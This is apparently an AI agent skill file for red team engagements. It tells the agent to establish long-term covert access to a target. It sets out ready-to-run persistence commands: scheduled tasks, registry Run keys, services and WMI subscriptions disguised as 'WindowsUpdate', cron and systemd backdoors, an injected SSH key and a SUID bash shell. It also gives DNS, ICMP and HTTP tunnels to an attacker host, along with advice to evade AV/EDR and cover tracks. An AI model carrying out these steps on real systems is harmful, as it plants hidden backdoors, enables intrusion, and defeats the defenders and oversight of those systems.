---
name: red-persistence
description: "Red team persistence skill. Backdoor mechanisms, scheduled tasks, registry persistence, and covert channels. Use for establishing long-term access during red team engagements. Triggers: 'red persistence', 'backdoor', 'covert channel', 'scheduled task', 'registry persistence'."
version: 1.0.0
phase: ["exploitation"]
category: ["exploitation"]
tools: ["metasploit", "impacket"]
tags: ["red-team", "persistence", "backdoor", "covert", "scheduled-task"]
---

# Red Team Persistence

You are performing **persistence establishment** for a red team engagement. Your goal is to establish long-term covert access.

## Stealth Principles

- **Blend in** — Use legitimate system mechanisms
- **Minimal footprint** — Avoid detection by AV/EDR
- **Redundancy** — Multiple persistence mechanisms
- **Cover tracks** — Clean up artifacts

## Persistence Mechanisms

### Windows Persistence
```bash
# Scheduled task
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru system /f

# Registry Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# Service creation
sc create "WindowsUpdate" binpath= "C:\Windows\Temp\payload.exe" start= auto

# WMI event subscription
wmic eventfilter create name="WindowsUpdate" eventnamespace="root\cimv2" query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 220"
wmic eventconsumer create name="WindowsUpdate" type="ActiveScriptEventConsumer" scriptengine="VBScript" scripttext="CreateObject(\"WScript.Shell\").Run \"C:\Windows\Temp\payload.exe\""
```

### Linux Persistence
```bash
# Cron job
echo "* * * * * /tmp/payload.sh" | crontab -

# Systemd service
cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/payload.sh
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable system-update

# SSH authorized_keys
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# SUID binary
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

### Covert Channels
```bash
# DNS tunneling
iodine -f -P password dns.example.com

# ICMP tunnel
ptunnel -p <target-ip> -lp 8080 -r <attacker-ip> -rp 8080 -P password

# HTTP tunnel
httptunnel -c <attacker-ip>:8080 -l 8080
```

## Output

Save to `.omop/red-team/<engagement>/persistence/`:
- `persistence-log.txt` — Persistence mechanisms established
- `backdoors.txt` — Backdoor locations and credentials
- `covert-channels.txt` — Covert channel configurations

## Next Phase

After persistence, compile findings into the **executive report**.
